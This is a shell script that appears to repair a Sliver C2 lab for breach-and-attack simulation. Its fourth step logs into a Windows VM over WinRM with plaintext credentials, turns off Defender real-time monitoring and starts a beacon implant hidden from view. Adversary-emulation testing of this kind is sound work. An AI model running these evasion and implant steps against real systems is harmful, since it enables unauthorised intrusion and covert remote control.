#!/bin/bash
# fix_sliver.sh — One-shot Sliver C2 connection repair
# Run as: sudo bash fix_sliver.sh
set -e

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'
USER_HOME="/home/akila"
CFG_DIR="$USER_HOME/.sliver-client/configs"
CFG_PATH="$CFG_DIR/bas_operator_localhost.cfg"
VENV_PY="/home/akila/Desktop/bas_platform/venv/bin/python3"

echo -e "${GREEN}[1] Ensuring Sliver server is running...${NC}"
systemctl is-active sliver &>/dev/null || systemctl start sliver
sleep 3
systemctl is-active sliver && echo -e "${GREEN}    ✓ Sliver active${NC}" || { echo -e "${RED}    ✗ Failed to start${NC}"; exit 1; }
ss -tlnp | grep 31337 | grep -q LISTEN && echo -e "${GREEN}    ✓ Port 31337 listening${NC}"

echo -e "${GREEN}[2] Regenerating operator config (fresh TLS certs)...${NC}"
mkdir -p "$CFG_DIR"
# Remove old stale config — sliver-server refuses to overwrite
rm -f "$CFG_PATH" /root/.sliver-client/configs/bas_operator_localhost.cfg
echo -e "${GREEN}    ✓ Removed stale configs${NC}"

sliver-server operator \
  --name bas_operator \
  --lhost localhost \
  --lport 31337 \
  --save "$CFG_PATH"

# When run as root, sliver-server may save to /root/.sliver-client — copy it back
if [ ! -f "$CFG_PATH" ] && [ -f /root/.sliver-client/configs/bas_operator_localhost.cfg ]; then
    cp /root/.sliver-client/configs/bas_operator_localhost.cfg "$CFG_PATH"
    echo -e "${GREEN}    ✓ Copied from /root to $CFG_PATH${NC}"
fi
chown akila:akila "$CFG_PATH"
echo -e "${GREEN}    ✓ Config ready at $CFG_PATH${NC}"

echo -e "${GREEN}[3] Testing gRPC connection...${NC}"
$VENV_PY - << PYEOF
import asyncio
from sliver import SliverClientConfig, SliverClient
async def test():
    cfg = SliverClientConfig.parse_config_file("/home/akila/.sliver-client/configs/bas_operator_localhost.cfg")
    client = SliverClient(cfg)
    await client.connect()
    beacons  = await client.beacons()
    sessions = await client.sessions()
    print(f"    Connected!  Beacons={len(beacons)}  Sessions={len(sessions)}")
    for b in beacons:
        print(f"      Beacon: {b.Name} | {b.Hostname} | {b.Username} | {b.OS}")
asyncio.run(test())
PYEOF

echo ""
echo -e "${GREEN}[4] Launching implant on Windows VM...${NC}"
$VENV_PY - << PYEOF
import winrm
TARGET, USER, PASS = '192.168.56.102', 'akila', '12345678'
print(f"    Connecting to {TARGET} via WinRM...")
try:
    s = winrm.Session(f'http://{TARGET}:5985/wsman', auth=(USER, PASS), transport='ntlm',
                      read_timeout_sec=20, operation_timeout_sec=15)
    s.run_ps('Set-MpPreference -DisableRealtimeMonitoring \$true 2>\$null')
    r = s.run_ps("Start-Process 'C:\\Users\\akila\\Desktop\\bas_beacon.exe' -WindowStyle Hidden -PassThru | Select-Object Id,Name")
    print("    Beacon launched:", r.std_out.decode().strip() or "(hidden)")
except Exception as e:
    print(f"    WinRM error: {e}")
    print("    → On Windows VM run: Start-Process C:\\Users\\akila\\Desktop\\bas_beacon.exe -WindowStyle Hidden")
PYEOF

echo ""
echo -e "${YELLOW}[5] Waiting 20s for beacon to check in...${NC}"
sleep 20

echo -e "${GREEN}[6] Checking for active beacons...${NC}"
$VENV_PY - << PYEOF
import asyncio
from sliver import SliverClientConfig, SliverClient
async def check():
    cfg = SliverClientConfig.parse_config_file("/home/akila/.sliver-client/configs/bas_operator_localhost.cfg")
    client = SliverClient(cfg)
    await client.connect()
    beacons = await client.beacons()
    print(f"    Active beacons: {len(beacons)}")
    for b in beacons:
        print(f"      ✓ {b.Name} | {b.Hostname} ({b.OS}) | User: {b.Username}")
    if not beacons:
        print("    No beacons yet — beacon may need more time or isn't running.")
asyncio.run(check())
PYEOF

echo ""
echo -e "${GREEN}Done! Restart the BAS API:${NC}"
echo -e "  cd /home/akila/Desktop/bas_platform && fuser -k 8000/tcp; ./run.sh"
